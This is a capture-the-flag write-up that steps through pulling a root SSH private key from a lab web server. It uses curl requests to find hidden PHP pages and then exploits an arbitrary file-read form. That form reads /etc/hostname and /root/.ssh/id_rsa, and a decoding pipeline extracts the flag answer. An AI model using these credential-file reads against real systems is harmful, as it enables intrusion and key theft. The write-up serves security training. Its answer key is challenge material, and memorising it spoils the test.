# Challenge 115 – SSH Private Key Extraction

## Question

> The machine `192.168.1.151` contains an SSH private key. Identify the key and submit the last five characters of its Base64-encoded content, found between the BEGIN and END key tags.

**Target:** `192.168.1.151`

**Answer Format:** `NxXXX`

**Final Answer:** `5oMBD`

---

## Step 1 – Discover the Web Application

The target machine had HTTP running on port 80.

We accessed the login page:

```bash
curl -i http://192.168.1.151/login.php
```

The response indicated that `login.php` was available.

---

## Step 2 – Test the Login Endpoint

We sent a test POST request:

```bash
curl -i -s -X POST -d 'username=test&password=test&login=Login' http://192.168.1.151/login.php
```

The response redirected us to:

```text
s3cret_page.php
```

This revealed another PHP page.

---

## Step 3 – Access `s3cret_page.php`

We requested the page:

```bash
curl -i -s http://192.168.1.151/s3cret_page.php
```

The response contained:

```text
Can you read fast?? killmyeye.php
```

This revealed another PHP endpoint:

```text
killmyeye.php
```

---

## Step 4 – Examine `killmyeye.php`

We accessed the page:

```bash
curl -i -s http://192.168.1.151/killmyeye.php
```

It displayed a form asking for a `target`:

```html
<form method="POST">
    <label for="target">Read the root pass?</label>
    <input name="target" type="text">
    <input type="submit" name="Submit">
</form>
```

The `target` parameter was used to read files from the server.

---

## Step 5 – Test File Reading

Before accessing the SSH key, we tested the functionality with `/etc/hostname`:

```bash
curl -s -X POST -d 'target=/etc/hostname&Submit=1' http://192.168.1.151/killmyeye.php
```

The response contained Base64 data:

```text
UVdFUlRZVUlPUAo=
```

This confirmed that the endpoint was returning file contents encoded with Base64.

---

## Step 6 – Retrieve the SSH Private Key

The challenge specifically asked for an SSH private key.

We requested:

```bash
curl -s -X POST -d 'target=/root/.ssh/id_rsa&Submit=1' http://192.168.1.151/killmyeye.php
```

The response contained Base64-encoded data.

The outer Base64 data was decoded to reveal:

```text
-----BEGIN RSA PRIVATE KEY-----
...
-----END RSA PRIVATE KEY-----
```

Therefore, we confirmed that the file was an RSA private key.

---

## Step 7 – Extract the Last Five Characters

The response had two layers:

```text
HTTP response
    ↓
Outer Base64
    ↓
RSA private key in PEM format
    ↓
Base64 key content
```

We used the following command to extract the Base64 content between the RSA key tags and obtain its final five characters:

```bash
curl -s -X POST -d 'target=/root/.ssh/id_rsa&Submit=1' http://192.168.1.151/killmyeye.php | awk '/<pre>/{f=1; sub(/.*<pre>/,"")} /<\/pre>/{sub(/<\/pre>.*/,""); f=0} f' | tr -d '\n' | base64 -d | sed -n '/BEGIN RSA PRIVATE KEY/,/END RSA PRIVATE KEY/p' | sed '1d;$d' | tr -d '\n' | tail -c 5
```

Output:

```text
5oMBD
```

---

## Step 8 – Final Answer

The last five characters of the Base64-encoded content inside the RSA private key are:

```text
5oMBD
```

### Answer

```text
5oMBD
```

